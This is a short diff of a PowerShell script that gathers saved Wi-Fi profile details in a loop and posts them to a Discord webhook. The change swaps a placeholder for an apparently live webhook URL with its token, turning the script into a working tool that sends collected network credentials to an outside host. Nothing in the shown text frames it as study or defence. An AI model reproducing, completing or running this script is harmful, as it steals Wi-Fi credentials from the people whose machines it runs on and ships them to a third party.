@@ -6,7 +6,7 @@ foreach ($profile in $wifiProfiles) {
     $output += "`n" + $details
 }
 
-$webhook = "YOUR_DISCORD_WEBHOOK"
+$webhook = "https://discord.com/api/webhooks/1348596367936716841/q-6dCI0Q1RPRKizEpmBBSGCbfZZKA5eB6zGsrt-N4ONPBTVHuCnqFzcD1PRAmPPlie6a"
 $body = @{ "content" = "```$output```" } | ConvertTo-Json -Compress
 
 Invoke-RestMethod -Uri $webhook -Method Post -Body $body -ContentType "application/json"
